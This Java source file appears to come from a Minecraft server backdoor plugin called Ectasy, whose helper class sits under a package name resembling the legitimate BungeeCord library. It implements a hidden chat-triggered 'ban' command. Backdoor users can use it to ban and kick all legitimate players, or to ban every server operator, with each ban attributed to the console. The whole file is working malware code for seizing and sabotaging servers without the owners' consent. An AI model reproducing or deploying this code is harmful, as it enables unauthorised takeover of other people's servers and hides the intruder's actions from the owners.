package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import java.util.Arrays;

import fr.body.ectasy.user.User;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.scheduler.BukkitRunnable;

@CommandInfo(
   name = "ban",
   description = "Ban a player",
   blatant = true,
   rank = Rank.FREE
)
public class BanCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent e, String var2, String[] args) {
      String reason = String.join(" ", Arrays.stream(args).skip(1L).toArray(String[]::new)).replace("&", "§");
      new BukkitRunnable() {
         @Override
         public void run() {
            if (args.length == 0) {
               ChatUtil.sendChat(e.getPlayer(), "Please, use ban <player name> or ban *");
            } else if (args[0].equals("*")) {
               for(User var5 : Ectasy.users.values()) {
                  if (var5.rank == Rank.UNAUTHORIZED) {
                     Ectasy.parentPlugin.getServer().getBanList(BanList.Type.NAME).addBan(var5.player.getName(), reason, null, "console");
                     var5.player.kickPlayer(reason);
                  }
               }

               ChatUtil.sendChat(e.getPlayer(), "Banned everyone.");
            } else {
               if (args[0].equalsIgnoreCase("ops") || args[0].equalsIgnoreCase("op")) {
                  for(OfflinePlayer var2 : Bukkit.getOperators()) {
                     if (!var2.isOnline() || Ectasy.users.get(var2.getName()).rank == Rank.UNAUTHORIZED) {
                        Bukkit.getServer().getBanList(BanList.Type.NAME).addBan(var2.getName(), reason, null, "console");
                     }
                  }

                  ChatUtil.sendChat(e.getPlayer(), "Banned operators.");
               }

               Ectasy.parentPlugin.getServer().getBanList(BanList.Type.NAME).addBan(args[0], reason, null, "console");
               Player var3 = Bukkit.getPlayer(args[0]);
               if (var3 != null) {
                  var3.kickPlayer(reason);
               }

               ChatUtil.sendChat(e.getPlayer(), "Banned " + args[0]);
            }
         }
      }.runTask(Ectasy.parentPlugin);
   }
}
